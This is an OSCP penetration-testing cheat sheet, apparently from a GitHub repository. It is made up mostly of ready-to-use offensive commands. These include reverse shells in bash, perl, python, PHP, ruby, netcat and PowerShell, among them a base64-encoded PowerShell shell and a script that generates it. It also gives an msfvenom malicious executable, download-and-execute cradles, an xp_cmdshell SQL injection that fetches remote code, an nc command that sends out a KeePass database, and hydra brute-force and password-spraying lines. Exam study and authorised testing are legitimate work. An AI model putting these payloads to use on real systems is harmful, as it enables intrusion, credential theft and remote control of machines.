SOURCED FROM: https://github.com/LeonardoE95/OSCP/blob/main/cheatsheet.org#chisel-and-internal-enumeration

# OSCP CheatSheet - Extended
# Basic info:

```php
whoami
```

```php
id
```

```php
cat /etc/groups
```

```php
find | grep flag
```

```php
sudo -l
```

---

**What is DNS Enumeration**

It’s referred to DNS Interrogation. You’re essentially querying it for various pieces of info — i.e. computer names, IP addresses, mail servers, associated mail servers, and various other DNS records.

**Host**

For example, when you type in the terminal:

The host tool resolves the domain (instagram.com) to these IP addresses:

![](https://miro.medium.com/v2/resize:fit:719/1*ONFaoqOdXWLVYS9zbe9KDQ.png)

- IPv4 address
- IPv6 address
- Additionally, it gives us the mail server

You can also use host filters (flags) to specify the type of info you’re looking for if you don’t want to go through all the info that is displayed by default.

I.e., if you’re looking for a particular name server of instagram.com you type:

![](https://miro.medium.com/v2/resize:fit:497/1*_OKftVPSujno2AQM4fdeBw.png)

From this info you can tell that these name servers are used by Instagram as its DNS providers.

You can also specify to search for mail server:

![](https://miro.medium.com/v2/resize:fit:717/1*GXNwUJrm5E1ruyL-LXlT5A.png)

Host can also be used for reserve lookup.

For example:

$ host (IP address of the domain name — in this case instagram.com which you have found in the previous host lookup. See above.)

![](https://miro.medium.com/v2/resize:fit:878/1*BDm0pew4oDCzsXoaicu2Xw.png)

**Nslookup**

It’s a very extensive tool.

For example, using nslookup for a simple domain lookup:

![](https://miro.medium.com/v2/resize:fit:368/1*OFtpSuMcPPLKYiC6-Nc-UA.png)

To search more extensively:

Example:

![](https://miro.medium.com/v2/resize:fit:245/1*PgKjQhtR2XPSaTNB2NLrfQ.png)

![](https://miro.medium.com/v2/resize:fit:579/1*COSnvws-q6_1lJqtBG__yg.png)

![](https://miro.medium.com/v2/resize:fit:245/1*c1Nzn1UPNI9hcmLiffZLmA.png)

![](https://miro.medium.com/v2/resize:fit:574/1*dSuS4VrwvHj_0iFxci4uDQ.png)

**Dig**

Dig it’s known as the DNS Swiss army knife.

Record type:

![](https://miro.medium.com/v2/resize:fit:883/1*bb7098_K0Vy4l2eFLxuc9Q.png)

For example, to use dig for a simple domain lookup:

![](https://miro.medium.com/v2/resize:fit:742/1*l6OsGw8cr4LGq0T4kcH3NA.png)

To check for all the other options just type:

![[Pasted image 20240714072403.png]]

To lookup for IPv6 addresses:

![](https://miro.medium.com/v2/resize:fit:743/1*aknuIeik6J7FhDTmh4ekxA.png)

To lookup for CNAME:

![](https://miro.medium.com/v2/resize:fit:913/1*i1w--BirgVVCR7Uef9wWoA.png)

To dig for the mail server:

![](https://miro.medium.com/v2/resize:fit:773/1*wmQNV8AZMcku2aHPHngPAw.png)

For name server lookup:

![](https://miro.medium.com/v2/resize:fit:750/1*iCFmP-4KmeWZi9mp3tTHCQ.png)

You can also shorten your lookup:

![](https://miro.medium.com/v2/resize:fit:395/1*2KONG2NwLNPt5BTNh1t0gA.png)

You can also do scripting with dig:

$ **for ip in $(dig linkedin.com +short);do nmap -sC -sV -Pn $ip; done**

![](https://miro.medium.com/v2/resize:fit:717/1*pa9pFo0SWbcppikJLbK8rQ.png)


---

# Upgrade Shell:

Python

```php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**CTL+Z**

Tell your machine to push the special characters straight to the target so we can use auto-complete etc.
```php
stty raw -echo && fg
```

In Tmux:
```php
export TERM=tmux-256color
```

```php
export TERM=xterm-256-color
```

Find my current TERM
```php
echo $TERM
# or
env | grep TERM
```

Then i can export it in target machine. Export for tmux which uses screen:

```php
export TERM=screen
```

- At this point i should be in the dev/shm directory and i should make another `secret` directory with a . at the beginning, for example: 
- `mkdir .secret`
- `cd .secret`
- Now i can transfer all tools into this folder, when the server restarts it will be deleted out of RAM, saving time doing clean-up. 
- Use `uname -a` to check architecture and determine what bit tool u need

If you have issues try xterm instead of xterm-256, or just use this if it's broken on the target:

```php
export TERM=xterm
```

Perl

```php
perl -e "exec '/bin/bash';"
```

Ruby 

```php
ruby -e "exec '/bin/bash'"
```
# Reverse Shells:

#### Bash

```php
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

```php
bash -c "bash -i >& /dev/tcp/192.168.45.183/443 0>&1"
```

#### Perl 

```php
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Python 

```php
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.218",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP

```php
<?php $sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

```php
php -r '$sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Ruby 

```php
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Netcat

```php
nc -e /bin/sh 10.0.0.1 1234
```

```php
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.218 1234 >/tmp/f
```

#### Malicious exe payload

```php
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.235 LPORT=7777 -f exe -o auditTracker.exe
```

#### Listener endpoint

```php
msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.45.235; set lport 7777; set ExitOnSession false; exploit -j"
```

#### Powershell

```php
powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.235:1337/Invoke-PowerShellTcp.ps1\")"
```

#### Create powershell one liner

```php
pwsh

$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText

powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

- After the oneline is created we can:
- Generate base64 powershell reverse shell (remember to change IP and PORT)

```php
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.10",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

return cmd
```


# Cracking

### Base64 

Decode base64

```php
echo -n "aWthVGVOVEFOdEVTCg==" | base64 -d
```

### KeePass

- First it we extract the password hash

```php
keepass2john Database.kdbx > keepass.hash
```

- Then we crack it. We can either use **john**
```php
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash 
```

- or **hashcat**. If we hashcat we must remember to strip off the initial “Database:” from the hash.

```php
hashcat -m 13400 keepass.hash rockyou.txt -r rockyou-30000.rule --force
```

### ssh key

First we extract the hash

```php
ssh2john id_rsa > ssh.hash
```

- Then we crack it, either with **john** or **hashcat**

```php
john --wordlist=/usr/share/wordlists/passwords/rockyou.txt hash.txt
```

```php
hashcat -m 22921 ssh.hash rockyou.txt --force
```

### NTLM

We can use **hashcat** with code 1000

```php
hashcat -m 1000 nelly.hash rockyou.txt -r best64.rule --force
```

### Net-NTLMv2

We can use **hashcat** with code 5600

```php
hashcat -m 5600 paul.hash rockyou.txt --force
```

### AS-REP roasting

- Suppose we perform a AS-REP attack over a windows AD

```php
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

- Then we get the following hash

```php
$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b01ec750cf35a2c37abde02f28b7aa363ffa1d18c9dd0262e43ab6a5447db24f71256120f94c24b17b1df465beed362fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd8658b147186042faaa686931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc22
```

- to crack it we can use hashcat with code `18200`

```php
sudo hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force
```

### Kerberoasting

- Suppose we perform a kerberoasting attack over a windows AD

```php
proxychains impacket-GetUserSPNs -request -dc-ip 10.10.132.146 oscp.exam/web_svc
```

- Then we get the following

```php
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
...
```

- to crack it we can use hashcat with code `13100`

```php
sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r best64.rule --force
```

# Tunneling

### socat

```php
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

### ssh

Four different types of tunnel:
- **Local port forwarding:** Created with option -L

```php
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 user@server
```

- **Dynamic port forwarding**: Created with option -D

```php
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

- **Remote port forwarding**: Created with option -R
- First we start a local ssh server
```php
sudo systemctl start ssh
```

- Then we connect back to it from the remote machine. In this case, we want to listen on port 2345 on our Kali machine (127.0.0.1:2345), and forward all traffic to the PostgreSQL port on PGDATABASE01 (10.4.50.215:5432).

```php
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

- We can then stop our ssh server: `sudo systemctl stop ssh`

**Remote dynamic port forwarding**: Created with option -R but without specifying endpoints.
- First we start a local ssh server: `sudo systemctl start ssh`
- Then we connect back to it from the remote machine. This creates a SOCKS5 proxy on our local machine at that port which is able to access all interfaces that are available to the victim machine.

```php
ssh -N -R 9998 kali@192.168.118.4
```

- We can then stop our ssh server: `sudo systemctl stop ssh`

### chisel

- First we download the executable on the remote machine

```php
certutil -urlcache -split -f "http://192.168.45.170:1337/chisel64.exe" chisel64.exe
```

- then we start the executable on our linux attacker box

```php
./chisel64.elf server -p 8000 --reverse
```

- and then we connect to it from the remote machine using our IP during the connection.

```php
chisel64.exe client 192.168.45.217:8000 R:socks
```

- This, by default, will create a SOCKS5 proxy within the endpoint 127.0.0.1:1080 of our local machine. To access that proxy we can edit the proxychains conf in order to put at the end

```php
socks5 127.0.0.1:1080
```

# Enumeration

### General

Nmap port scanning

```php
nmap -sC -sV <IP>
nmap -p- <IP>
sudo nmap -sU -p161 <IP>
proxychains nmap -sT --top-ports=100 -Pn <IP>
```

Nmap scripts

```php
less /usr/share/nmap/scripts | grep "ftp"
```

Nmap safe scripts

```php
nmap -p 445 --script "safe" -Pn -n <IP>
```
- Try removing quotes if you have issues as i have not tested this yet, and look up -n.
- I think you can do "vuln and safe" in the same argument. These look like categories.

Categories search

```bash
grep -r /usr/share/nmap/scripts/*.nse | grep -oP '".*?"' | sort -u
```

![[Pasted image 20240713181750.png]]

Nmap vuln scripts

```php
nmap -p 445 --script "vuln" -Pn -n <IP>
```

Nmap vulners

```php
nmap -sV --script vulners [--script-args mincvss=4] <target>
```

Port scanning in windows

```php
Test-NetConnection -Port 445 192.168.50.151
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

Search for exploits and copy them

```php
searchsploit <SOFTWARE>
searchsploit -m 16051
```

DNS zone transfer attack

```php
dig axfr oscp.exam @192.168.221.156
```

Login with RDP

```php
xfreerdp /u:yoshi /p:"Mushroom!" /v:172.16.219.82
```

KeePass database

```php
kpcli --kdb=Database.kdbx
kpcli:/Database/Network> show -f 0
```

Extract data from pdf

```php
exiftool -a file.pdf
```

# Brute Forcing

Brute forcing RDP with hydra

```php
hydra -l user -P rockyou.txt rdp://192.168.50.202
```

Brute forcing FTP with hydra

```php
hydra -l itadmin -I -P rockyou.txt -s 21 ftp://192.168.247.202
```

Brute forcing SSH with hydra

```php
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

Brute forcing HTTP POST login with hydra

```php
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

Password spraying RDP with hydra

```php
hydra -L users.txt -p "SuperS3cure1337#" rdp://192.168.247.202
```

# HTTP

gobuster directory mode

```php
gobuster dir -t20 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.216.121 -x aspx
```

gobuster vhost mode

```php
gobuster vhost --wordlist /home/kali/repos/projects/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://oscp.exam:8000 --exclude-length 334
```

wfuzz

```php
wfuzz -w /home/kali/repos/projects/SecLists/Discovery/DNS/subdomains-top1million-110000.txt http://192.168.238.150:8080/search?FUZZ=FUZZ
```

kiterunner to enumerate API endpoints

```php
kiterunner scan http://192.168.243.143/api/ -w routes-small.kite -x 20
```

php filters with LFI

```php
curl http://192.168.193.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../..//var/www/html/backup.php
```

```php
curl http://192.168.193.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
```

enumerate wordpress sites

```php

# default enumeration
wpscan --url http://10.10.10.88/webservices/wp

# enumerates vulnerable plugins
wpscan --url http://10.10.10.88/webservices/wp --enumerate vp

# enumerates all plugins
wpscan --url http://10.10.10.88/webservices/wp --enumerate ap

# enumerate all plugins using proxy
wpscan --url http://10.10.10.88/webservices/wp/index.php --proxy 127.0.0.1:8080 --enumerate ap

# enumerate everything
wpscan --url http://10.10.10.88/webservices/wp/index.php --proxy 127.0.0.1:8080 --enumerate ap tt at

# enumerate users and vulnerable plugins
wpscan --url <Target>/wordpress -e u,vp

# brute force page
wpscan --url http://10.10.111.70/wordpress/wp-login.php -v -P /usr/share/wordlists/rockyou.txt -U elyana 
```

sqlmap - check website for sql injection (more info down)

 [Sqlmap trick](https://hackertarget.com/sqlmap-post-request-injection/) - if we have a login page, we can try admin:admin, catch that in burpsuite,  save the full request to a file, run:

```php
    sqlmap -r FILENAME --level=5 --risk=3 --batch
    sqlmap -r FILENAME -dbs --level=5 --risk=3 --batch

    sqlmap -r FILENAME --dbs #enumarate DB's
    sqlmap -r FILENAME -D DB_Name --tables #enumarate tables
    sqlmap -r FILENAME -D DB_Name -T TABLE_Name --dump #DUMP table

    #Find SQL in webpage url automatically
    sqlmap -u https://IP/ –crawl=1

    #with authentication
    sqlmap -u “http://target_server” -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password

    #Get A Reverse Shell (MySQL)
    sqlmap -r post_request.txt --dbms "mysql" --os-shell
```


# SMB

nmap to get basic info

```php
nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
```

check for anonymous share

```php
smbmap -H <IP>
```

Connect to SMB share

```php
smbclient //172.16.246.11/C$ -U medtech.com/joe%Password
smbclient //192.168.212.248/transfer -U damon --pw-nt-hash 820d6348590813116884101357197052 -W relia.com
```

download recursively entire share

```php
smbget -a -R smb://active/Replication
```

list share of particular user with username and password

```php
crackmapexec smb 192.168.242.147 -u web_svc -p Dade --shares
```

list share of particular user with NTLM hash

```php
crackmapexec smb 192.168.242.147 -u web_svc -H 822d2348890853116880101357194052
```

password spraying

```php
crackmapexec smb 192.168.242.147 -u usernames.txt -p Diamond1 --shares
```

crawl all files

```php
crackmapexec smb active -u "" -p "" -M spider_plus
```

Start SMB server

```php
impacket-smbserver smbfolder $(pwd) -smb2support -user kali -password kali
```

enum4linux

```php
enum4linux -h <IP>
```

Nmap scripts

```php
ls -la /usr/share/nmap/scripts | grep "smb"
```


# SNMP

Download necessary stuff to deal with SNMP extended objects

```php
sudo apt-get install snmp-mibs-downloader
download-mibs
sudo nano /etc/snmp/snmp.conf (comment line saying "mibs :")
```

Enumerate all available communities, the wordlist can be downloaded from SecLists

```php
onesixtyone -c common-snmp-community-strings-onesixtyone.txt 192.168.238.149 -w 100
```

Simple walk

```php
snmpbulkwalk -c public -v2c 192.168.238.149 > out.txt
```

Enumerate extended objects

```php
snmpwalk -v1 -c public 192.168.221.156  NET-SNMP-EXTEND-MIB::nsExtendObjects
```

# Linux

linenum

```php
curl http://192.168.45.198/linenum.sh > linenum.sh
chmod +x linenum.sh
./linenum.sh | tee linenum_output.txt
```

linpeas

```php
curl http://192.168.45.198/linpeas.sh > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.txt
```

pspy64 to view cronjobs
- try a smaller, or different version if it doesn't work first time.

```php
curl http://192.168.45.198/pspy64 > pspy64
chmod +x pspy64
./pspy64
```

SUID files

```php
find / -perm -u=s  2>/dev/null
```

SGID files

```php
find / -perm -g=s -type f 2>/dev/null
```

Search particular filename

```php
find / -name "*GENERIC*" -ls
```

print env variables `env`

### Metasploit

Examine exploit

```php
searchsploit -x <EXPLOIT_PATH>
```

Copy to directory (mirror)

```php
searchsploit -m <EXPLOIT_PATH>
```

Transfer files

```php
upload <FILE_PATH>
```

Basic system info

```php
sysinfo
```

Drop into shell
```php
shell
```

- You may need to use `bash -i` for interactive shell
# Windows
### Basic enumeration

operating system, version and architecture

```php
systeminfo
```

launch powershell

```php
powershell -ep bypass
```

list my user

```php
whoami
```

list my priv

```php
whoami /priv
```

list my groups

```php
whoami /groups
```

list users

```php
net user
```

list my users details

```php
net user <MY-NAME>
```

list account policy

```php
net accounts
```

existing groups

```php
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember <GROUP-NAME>
```

network information

```php
ipconfig /all
route print
netstat -ano
```

get env variables

```php
dir env:
```

installed apps (32 bit)

```php
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

installed apps (64 bit)

```php
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

running processes

```php
Get-Process
```

### Files, services and History

search files recursively

```php
Get-ChildItem -Path C:\Users\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

To get the list of hidden files from a directory you can run the below command.

```php
dir directory_path /A:H /B
```
  
  - example while already in path to search

```php
dir /a:hd
```

```php
icacls auditTracker.exe
```

get service info

```php
Get-Service * | Select-Object Displayname,Status,ServiceName,Can*
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Search history

```php
(Get-PSReadlineOption).HistorySavePath
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\Public\Transcripts\transcript01.txt
```

Connect to MSSQL database

```php
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

### File transfer

```php
certutil -urlcache -split -f "http://192.168.45.170:1337/chisel64.exe" chisel64.exe
```

```php
iwr -uri http://192.168.45.159:1337/winPEASx64.exe -Outfile winPEASx64.exe
```

Transfer files from window using nc

```php
Get-Content "Database.kdbx" | .\nc.exe 192.168.45.239 5555
```

Typical files to transfer

```python
iwr -uri http://192.168.45.159:1337/ncat.exe -Outfile ncat.exe
iwr -uri http://192.168.45.159:1337/mimikatz64.exe -Outfile mimikatz64.exe
iwr -uri http://192.168.45.159:1337/chisel64.exe -Outfile chisel64.exe

iwr -uri http://192.168.45.159:1337/winpeas64.exe -Outfile winpeas64.exe
iwr -uri http://192.168.45.159:1337/privesccheck.ps1 -Outfile privesccheck.ps1
iwr -uri http://192.168.45.159:1337/SharpHound.exe -Outfile SharpHound.exe

iwr -uri http://192.168.45.159:1337/insomnia_shell.aspx -Outfile insomnia_shell.aspx
iwr -uri http://192.168.45.159:1337/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
iwr -uri http://192.168.45.159:1337/GodPotato-NET2.exe -Outfile GodPotato-NET2.exe
iwr -uri http://192.168.45.159:1337/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
iwr -uri http://192.168.45.159:1337/GodPotato-NET35.exe -Outfile GodPotato-NET35.exe
iwr -uri http://192.168.45.159:1337/JuicyPotatoNG.exe -Outfile JuicyPotatoNG.exe
```

Other types of file transfer

```php
(new-object System.Net.WebClient).DownloadFile("http://10.10.122.141/Script/mimikatz64.exe", "C:\TEMP\mimikatz64.exe")
```

Start SMB server

```php
impacket-smbserver smbfolder $(pwd) -smb2support -user kali -password kali
```

user SMB server within windows machine

```php
$pass = convertto-securestring 'kali' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('kali', $pass)
New-PSDrive -Name kali -PSProvider FileSystem -Credential $cred -Root \\192.168.45.245\smbfolder

cd kali:
copy kali:\PrintSpoofer64.exe C:\TEMP
copy kali:\ncat.exe C:\TEMP
copy kali:\SharpHound.exe C:\TEMP
```

### Automated tools

winPEASx64 [https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

Issue with latest build of missing DLL. To fix use this release [https://github.com/carlospolop/PEASS-ng/releases/tag/20230423-4d9bddc5](https://github.com/carlospolop/PEASS-ng/releases/tag/20230423-4d9bddc5)

```php
iwr -uri http://192.168.45.159:1337/winpeas64.exe -Outfile winpeas64.exe
./winPEASx64.exe
```

PrivescCheck [https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)

```php
iwr -uri http://192.168.45.159:1337/privesccheck.ps1 -Outfile privesccheck.ps1
. .\privesccheck.ps1
Invoke-PrivescCheck -Extended -Report "privesccheck_$($env:COMPUTERNAME)"
```

# Windows AD

List all currently joined machine in the AD

```php
Get-ADComputer -Filter * -Properties Name -Server "oscp.exam"
Get-ADComputer -Filter * -Properties ipv4Address, OperatingSystem, OperatingSystemServicePack | Format-List name, ipv4*, oper*
```

---

**CrackMapExec**

Enumerate smb, winrm, rdp and ssh through crackmapexec, with password and hashes

```php
proxychains crackmapexec smb IP1 IP2 -u USERNAME -p PASSWORD --shares
proxychains crackmapexec winrm IP1 IP2 -u USERNAME -p PASSWORD --continue-on-success 
proxychains crackmapexec rdp IP1 IP2 -u USERNAME -p PASSWORD
proxychains crackmapexec ssh IP1 IP2 -u USERNAME -p PASSWORD

proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HAHSH --shares
```

---

**SharpHound & BloodHound**

transfer sharphound into the remote machine, collect data and transfer data back to attacker machine

```php
iwr -uri http://192.168.45.159:1337/SharpHound.exe -Outfile SharpHound.exe
./SharpHound.exe --CollectionMethods All
```

start neo4j. Default creds are `neo4j:admin`

```php
sudo /usr/bin/neo4j console
http://localhost:7474/browser/
```

launch bloodhound

```php
./BloodHound --no-sandbox
```

---

**PowerView**

TODO

---

# Exploitation

## Web

### MSFVenom 

- Determine framework the server is running with wappalyzer, google, and burp etc.
- Look for server version info to help determine the framework, `asp.net` for example.
- `VBScript` or `.net` 2008 era. I think `VBScript` is an earlier version.

Help

```php
msfvenom -h
```

Show payloads for specific OS

```php
msfvenom -l | grep windows
```

**Windows Meterpreter Reverse_Tcp**

```php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx -o shell.aspx
```

List formats

```php
msfvenom -h --help-formats
```

**To use this we would open msfconsole and start a listener**

```php
use exploit/multi/handler
```

- Show options
- Set payload

```php
set payload windows/meterpreter/reverse_tcp
```

- Show options
- Set LHOST tun0
- Set port
- Run

**MSF**

Launch new session

```php
sessions -i 1
```

Commands

Get system info 

```php
sysinfo
```

- Type `shell` to go into the target system 
- Type `systeminfo` to view hotfix information, install date, version, and service pack etc
- Type `exit` to background the session
- Search suggest
- Use local_exploit_suggester

```php
use /post/multi/recon/local_exloit_suggester
```

- Show options
- Set session to 1, or whatever you have the desired session target set as.
- Run
- Copy exploit directory and use it

```php
use exploit/windows/local/ms10_015_kitrap0d
```

- Show options
- Set SESSION
- Set LHOST and LPORT (I don't think it's case sensetive)
- Run
- You should now be able to shell into the system as root if the exploit works
## SQLi

Basic SQLi

```php
' OR 1=1 --
```

XP_CMDSHELL in mssql

```php
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
' ; EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.248:1337/Invoke-PowerShellTcp.ps1\")" '; --
```

Union select

```php
username=' UNION SELECT 'nurhodelta','password','c','d','f','a','a' -- &password=password&login=
```

---
### Oracle

* Finding version

```sql
SELECT * FROM v$version;
SELECT * FROM v$version WHERE banner LIKE 'Oracle%';
SELECT banner FROM v$version WHERE rownum=1
```

* Finding tables

```sql
SELECT table_name FROM all_tables
```

* Finding columns for every table

```sql
SELECT table_name, column_name FROM all_tab_columns
```

* Inducing _Time Delay_ to determine if the application is vulnerable to SQLi

```sql
BEGIN DBMS_LOCK.SLEEP(seconds); END;
```

### Postgres SQL

* Finding version

```sql
SELECT version()
```

* Finding tables

```sql
SELECT table_schema,table_name FROM information_schema.tables
SELECT tablename from pg_tables
```

* Finding columns for every table

```sql
SELECT table_schema,table_name,column_name FROM information_schema.columns
```

* Inducing _Time Delay_ to determine if the application is vulnerable to SQLi

```sql
PG_SLEEP(seconds)
```

### MySQL

* Finding version

```sql
SELECT @@ version
```

* Finding tables

```sql
SELECT table_schema,table_name FROM information_schema.tables
```

* Finding columns for every table

```sql
SELECT talbe_schema,table_name,column_name FROM information_schema.columns
```

* Inducing _Time Delay_ to determine if the application is vulnerable to SQLi

```sql
SLEEP(seconds)
```

### MSSQL

* Finding version

```sql
SELECT @@ version
```

* Finding tables

```sql
SELECT table_schema,table_name FROM information_schema.tables
SELECT name FROM sysobjects WHERE xtype = 'U' --
```

* Finding columns for every table

```sql
SELECT table_schema,table_name,column_name FROM information_schema.columns
```

* Inducing _Time Delay_ to determine if the application is vulnerable to SQLi

```sql
WAIT FOR DELAY '00:00:SS'
```

---
### Tips and tricks
### Universal injection / from @theXSSrat

```
‘“`<u>blab${7*7} 
into every field you see to test for 
- SQLi
- js XSS
- html attribute xss
- HTMLi XSS
- SSTI
```

### RCE bypass / from @pikpikcu

```
